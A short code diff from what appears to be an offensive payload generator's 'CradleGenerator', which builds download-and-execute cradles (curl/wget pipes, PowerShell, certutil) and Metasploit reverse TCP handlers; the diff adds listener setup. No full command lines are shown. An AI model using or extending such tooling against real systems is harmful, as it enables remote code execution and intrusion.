@@ -1,7 +1,7 @@
 import base64
 import random
 import string
-from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, msf_handler
+from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, msf_handler, build_listener_setup
 
 _VARIANTS = ["curl_pipe", "wget_pipe", "curl_exec", "ps_iwr", "certutil_cradle"]
 
@@ -47,6 +47,7 @@ class CradleGenerator(ShellGenerator):
             listener=note,
             tty_upgrade=None,
             msf_compat=msf_handler("payload/generic/shell_reverse_tcp", opts.lhost, opts.lport),
+            listener_setup=build_listener_setup(opts.lhost, opts.lport),
         )
 
     def _curl_pipe(self, url: str, obfuscate: bool) -> str:
